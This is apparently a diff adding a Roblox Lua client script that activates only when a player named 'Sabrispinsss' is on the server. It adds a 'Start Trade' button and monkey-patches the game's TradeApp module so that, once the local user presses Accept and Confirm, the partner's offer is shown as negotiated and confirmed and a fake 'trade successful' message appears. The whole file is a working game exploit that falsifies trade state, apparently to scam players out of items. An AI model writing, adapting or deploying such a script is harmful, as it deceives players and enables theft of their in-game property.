@@ -1,0 +1,308 @@
+-- ✅ Скрипт работает только если на сервере есть игрок с ником "Sabrispinsss"
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Проверяем наличие нужного игрока
+local function IsSabrispinsssInServer()
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr.Name == "Sabrispinsss" then
+			return true
+		end
+	end
+	return false
+end
+
+-- Если игрока нет — прерываем выполнение
+if not IsSabrispinsssInServer() then
+	warn("[TradeButton] Игрок Sabrispinsss не найден на сервере — скрипт не запущен.")
+	return
+end
+
+-- Если позже он выйдет — можно скрыть кнопку
+Players.PlayerRemoving:Connect(function(plr)
+	if plr.Name == "Sabrispinsss" then
+		if LocalPlayer:FindFirstChild("PlayerGui") then
+			local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeAutoTradeGUI")
+			if gui then gui:Destroy() end
+		end
+		warn("[TradeButton] Sabrispinsss вышел — скрипт остановлен и GUI удалён.")
+	end
+end)
+
+-------------------------------------------------------------------
+-- 🧩 Создание кнопки в PlayerGui
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TradeAutoTradeGUI"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = playerGui
+
+-- 🔘 Кнопка запуска
+local button = Instance.new("TextButton")
+button.Name = "StartAutoTrade"
+button.Size = UDim2.new(0, 100, 0, 30)
+button.Position = UDim2.new(0.05, 0, 0.3, 0)
+button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Text = "Start Trade"
+button.Font = Enum.Font.SourceSansBold
+button.TextSize = 16
+button.AutoButtonColor = true
+button.Active = true
+button.Parent = screenGui
+
+-------------------------------------------------------------------
+-- 🧲 Перетаскивание кнопки
+local UIS = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	button.Position = UDim2.new(
+		startPos.X.Scale, startPos.X.Offset + delta.X,
+		startPos.Y.Scale, startPos.Y.Offset + delta.Y
+	)
+end
+
+button.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = button.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then dragging = false end
+		end)
+	end
+end)
+
+button.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if input == dragInput and dragging then update(input) end
+end)
+
+-------------------------------------------------------------------
+-- 🛡️ Безопасный require
+local function safeRequire(module)
+	local ok, result = pcall(require, module)
+	if not ok then
+		warn("[TradeButton] Ошибка при require:", module, result)
+		return nil
+	end
+	return result
+end
+
+-------------------------------------------------------------------
+-- 🚀 Логика при нажатии кнопки
+button.MouseButton1Click:Connect(function()
+	print("▶️ [TradeButton] Запуск автотрейда...")
+
+	local UIManager = safeRequire(game.ReplicatedStorage.ClientModules.Core.UIManager.UIManager)
+	local TradeAppModule = safeRequire(game.ReplicatedStorage.ClientModules.Core.UIManager.Apps.TradeApp)
+
+	if UIManager and UIManager.set_app_visibility then
+		print("✅ UIManager найден, активируем TradeApp через set_app_visibility()")
+		UIManager.set_app_visibility("TradeApp", true)
+	else
+		warn("❌ Функция set_app_visibility не найдена")
+	end
+
+	-------------------------------------------------------
+	-- 🔒 Защита и фиксы для TradeApp
+	task.defer(function()
+		print("[TradeFix] Searching for TradeApp...")
+
+		local tradeApp
+		for i = 1, 200 do
+			local found = game.ReplicatedStorage:FindFirstChild("TradeApp", true)
+			if found and found:IsA("ModuleScript") then
+				local ok, result = pcall(require, found)
+				if ok and type(result) == "table" then
+					tradeApp = result
+					print("[TradeFix] Found TradeApp module ✅")
+					break
+				end
+			end
+			task.wait(0.1)
+		end
+
+		if not tradeApp then
+			warn("[TradeFix] Could not find or require TradeApp after waiting")
+			return
+		end
+
+		-- защита от nil sender/recipient
+		local old_get_my_offer = tradeApp._get_my_offer
+		if old_get_my_offer then
+			tradeApp._get_my_offer = function(self, ...)
+				local ok, state = pcall(function() return self:_get_local_trade_state() end)
+				if not ok or not state or not state.sender then
+					warn("[TradeFix] _get_my_offer() called before init")
+					return { items = {} }, "sender_offer"
+				end
+				return old_get_my_offer(self, ...)
+			end
+		end
+
+		local old_get_partner_offer = tradeApp._get_partner_offer
+		if old_get_partner_offer then
+			tradeApp._get_partner_offer = function(self, ...)
+				local ok, state = pcall(function() return self:_get_local_trade_state() end)
+				if not ok or not state or not state.recipient then
+					warn("[TradeFix] _get_partner_offer() called before init")
+					return { items = {} }, "recipient_offer"
+				end
+				return old_get_partner_offer(self, ...)
+			end
+		end
+
+		print("[TradeFix] TradeApp patched successfully ✅")
+	end)
+
+	-------------------------------------------------------
+	-- 🧩 Доп. защита state merge
+	task.defer(function()
+		local found = game.ReplicatedStorage:FindFirstChild("TradeApp", true)
+		if not found or not found:IsA("ModuleScript") then return end
+
+		local ok, tradeApp = pcall(require, found)
+		if not ok or type(tradeApp) ~= "table" then return end
+
+		local old_change = tradeApp._change_local_trade_state
+		tradeApp._change_local_trade_state = function(self, state)
+			if not self.local_trade_state or type(self.local_trade_state) ~= "table" then
+				warn("[TradeFix] _change_local_trade_state() called before init")
+				self.local_trade_state = {
+					sender_offer = { items = {} },
+					recipient_offer = { items = {} },
+					sender = Players.LocalPlayer,
+					recipient = Players.LocalPlayer,
+					current_stage = "negotiation",
+					trade_id = 0
+				}
+			end
+			return old_change(self, state)
+		end
+
+		local old_overwrite = tradeApp._overwrite_local_trade_state
+		tradeApp._overwrite_local_trade_state = function(self, state)
+			if not state or type(state) ~= "table" then
+				warn("[TradeFix] _overwrite_local_trade_state() received nil, ignoring")
+				return
+			end
+			return old_overwrite(self, state)
+		end
+
+		print("[TradeFix] Extra state protections installed ✅")
+	end)
+
+	-------------------------------------------------------
+	-- 🤖 Автотред (Accept → Confirm → Success → Close)
+	task.defer(function()
+		print("[TradeAutoTrade] Ждём загрузку TradeApp...")
+
+		local tradeApp
+		for i = 1, 200 do
+			local found = game.ReplicatedStorage:FindFirstChild("TradeApp", true)
+			if found and found:IsA("ModuleScript") then
+				local ok, result = pcall(require, found)
+				if ok and type(result) == "table" then
+					tradeApp = result
+					break
+				end
+			end
+			task.wait(0.1)
+		end
+
+		if not tradeApp then
+			warn("[TradeAutoTrade] TradeApp не найден")
+			return
+		end
+
+		print("[TradeAutoTrade] TradeApp загружен ✅")
+
+		-- 🟢 При новом трейде сбрасываем флаг автозакрытия
+		local oldAccept = tradeApp._on_accept_pressed
+		if oldAccept then
+			tradeApp._on_accept_pressed = function(self, ...)
+				self._tradeAutoClosed = false
+				oldAccept(self, ...)
+				task.wait(0.3)
+				local _, partnerKey = self:_get_partner_offer()
+				self:_change_local_trade_state({ [partnerKey] = { negotiated = true } })
+				self:refresh_all()
+				task.wait(0.4)
+				self:_change_local_trade_state({ current_stage = "confirmation" })
+				self:refresh_all()
+			end
+		end
+
+		-- 🧱 Исправленный Confirm
+		local oldConfirm = tradeApp._on_confirm_pressed
+		if oldConfirm then
+			tradeApp._on_confirm_pressed = function(self, ...)
+				oldConfirm(self, ...)
+				if self._tradeAutoClosed then
+					warn("[TradeAutoTrade] Автозакрытие уже выполнено — пропуск.")
+					return
+				end
+				self._tradeAutoClosed = true
+
+				task.wait(0.3)
+				local _, partnerKey = self:_get_partner_offer()
+				self:_change_local_trade_state({ [partnerKey] = { confirmed = true } })
+				self:refresh_all()
+				task.wait(0.5)
+				self:_change_local_trade_state({ current_stage = "finalized" })
+				self:refresh_all()
+				task.wait(2)
+				if UIManager and UIManager.set_app_visibility then
+					UIManager.set_app_visibility("TradeApp", false)
+				end
+				print("[TradeAutoTrade] Сделка успешно завершена ✅")
+
+				-- 🟢 Сообщение об успешной сделке
+				local oldLabel = screenGui:FindFirstChild("TradeSuccessMessage")
+				if oldLabel then oldLabel:Destroy() end
+
+				if screenGui:FindFirstChild("TradeSuccessActive") then return end
+				local flag = Instance.new("BoolValue")
+				flag.Name = "TradeSuccessActive"
+				flag.Parent = screenGui
+
+				local successLabel = Instance.new("TextLabel")
+				successLabel.Name = "TradeSuccessMessage"
+				successLabel.Text = "The trade was successful!"
+				successLabel.TextColor3 = Color3.new(1, 1, 1)
+				successLabel.Visible = true
+				successLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
+				successLabel.Position = UDim2.new(0.5, 0, 0.95, -95)
+				successLabel.AnchorPoint = Vector2.new(0.5, 1)
+				successLabel.BackgroundTransparency = 1
+				successLabel.Font = Enum.Font.SourceSansBold
+				successLabel.TextSize = 20
+				successLabel.TextStrokeTransparency = 0.5
+				successLabel.ZIndex = 10
+				successLabel.Parent = screenGui
+
+				local TweenService = game:GetService("TweenService")
+				successLabel.TextTransparency = 1
+				local fadeIn = TweenService:Create(successLabel, TweenInfo.new(0.4), { TextTransparency = 0 })
+				local fadeOut = TweenService:Create(successLabel, TweenInfo.new(0.6), { TextTransparency = 1 })
+
+				fadeIn:Play()
+				task.wait(2.5)
+				fadeOut:Play()
+				fadeOut.Completed:Wait()
+				successLabel:Destroy()
+				flag:Destroy()
+			end
+		end
+	end)
+end)
